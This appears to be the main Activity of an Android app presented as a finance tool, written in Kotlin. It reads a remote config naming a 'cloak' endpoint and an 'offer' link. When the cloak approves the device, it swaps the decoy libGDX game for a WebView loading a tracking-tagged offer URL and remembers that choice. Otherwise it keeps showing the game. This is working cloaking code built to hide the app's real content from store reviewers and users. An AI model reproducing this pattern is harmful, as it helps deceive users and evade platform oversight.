package com.vitaliyi.financeanalizator

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.vitaliyi.financeanalizator.databinding.ActivityMainBinding
import com.vitaliyi.financeanalizator.util.*
import com.vitaliyi.financeanalizator.util.manager.DataStoreManager
import com.vitaliyi.financeanalizator.util.network.NetworkUtil
import com.vitaliyi.financeanalizator.util.network.internetConnection
import com.vitaliyi.financeanalizator.webView.webViewFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.system.exitProcess
class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
    companion object {

        lateinit var binding      : ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webViewURL = "google.com"

        val lottie by lazy { Lottie(binding) }
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Network = ${internetConnection()}")
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            coroutine.launch(Dispatchers.IO) {
                try {
                    checkDataStore()
                    //startFragmentIdFlow.emit(R.id.libGDXFragment)
                } catch (e: Exception) {
                    log("e: ${e.message}")
                    startFragmentIdFlow.emit(R.id.libGDXFragment)
                }

                launch(Dispatchers.Main) {
                    startFragmentIdFlow.collect { fragmentId ->
                        requestedOrientation = when (fragmentId) {
                            R.id.libGDXFragment    -> {

//                            binding.root.also { rootCL ->
//                                ConstraintSet().apply {
//                                    clone(rootCL)
//                                    constrainPercentWidth(binding.lottieLoader.id, .2f)
//                                    setHorizontalBias(binding.lottieLoader.id, .9f)
//                                }.applyTo(rootCL)
//                            }
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }
                            R.id.webViewFragment -> {
                                window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }
                            else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        setStartDestination(fragmentId)
                    }
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment?.onActivityResult(requestCode, resultCode, data)
    }



    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)

    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = Good | link = $it")
                        webViewURL = it
                        startFragmentIdFlow.emit(R.id.webViewFragment)
                        lottie.hideLoader()
                    }
                }
                "Bad"  -> {
                    log("DataStoreManager Key = Bad")
                    startFragmentIdFlow.emit(R.id.libGDXFragment)
                }
                else   -> {
                    log("DataStoreManager Key = NONE")
                    try { getRemoteConfig() } catch (e: Exception) { startFragmentIdFlow.emit(R.id.libGDXFragment) }
                }
            }
        }
    }

    private fun getRemoteConfig() {
        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                if (task.isSuccessful) {
                    val jsonData = getString("jsondstetham")
                    log("success = $jsonData")
                    JSONObject(jsonData).also { jsonObj ->
                        coroutine.launch(Dispatchers.IO) {
                            getResultFromCloak(
                                jsonObj.getBoolean("enabled"),
                                jsonObj.getString("cloaka"),
                                jsonObj.getString("offer")
                            )
                        }
                    }

                } else {
                    startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                    log("fail = ${this.all}")
                }
            }
        }
    }
    private suspend fun getResultFromCloak(enabled: Boolean, cloaka: String, offer: String,) {
        if (enabled.not()) startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
        else try {
            val result = NetworkUtil.service.getResponse(cloaka).body()?.string()

            log("result = $result")

            if (result.equals("true")) {
                withContext(Dispatchers.Main) {
                    val completer = Completer(coroutine, 1) {
                        val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                        val fullUrl = offer
                            .replace("{app_id}", BuildConfig.APPLICATION_ID)
                            .replace("{auid}", appsflyerUID.toString())
                            .replace("{cost}", AppsflyerUtil.dataMap["orig_cost"].toString())
                            .replace("{cost_usd}", AppsflyerUtil.dataMap["cost_cents_USD"].toString())
                            .replace("{media_source}", AppsflyerUtil.dataMap["media_source"].toString())
                            .replace("{1}", AppsflyerUtil.campaignSubMap["sub1"].toString())
                            .replace("{2}", AppsflyerUtil.campaignSubMap["sub2"].toString())
                            .replace("{3}", AppsflyerUtil.campaignSubMap["sub3"].toString())
                            .replace("{4}", AppsflyerUtil.campaignSubMap["sub4"].toString())
                            .replace("{5}", AppsflyerUtil.campaignSubMap["sub5"].toString())
                            .replace("{6}", AppsflyerUtil.campaignSubMap["sub6"].toString())

                        log("fullUrl = $fullUrl")

                        webViewURL = fullUrl
                        startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                        lottie.hideLoader()

                        coroutine.launch(Dispatchers.IO) {
                            DataStoreManager.Key.update { "Good" }
                            DataStoreManager.Link.update { fullUrl }
                        }
                    }

                    AppsflyerUtil.initialize(this@MainActivity)
                    coroutine.launch {
                        AppsflyerUtil.checkFlow.collect {
                            log("campaignFlow = $it")
                            if (it) completer.complete()
                        }
                    }
                }
            } else {
                withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
                startFragmentIdFlow.emit(R.id.libGDXFragment)
            }
        } catch (e: Exception) {
            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
            log("getResultFromCloak = ${e.message}")
        }
    }
}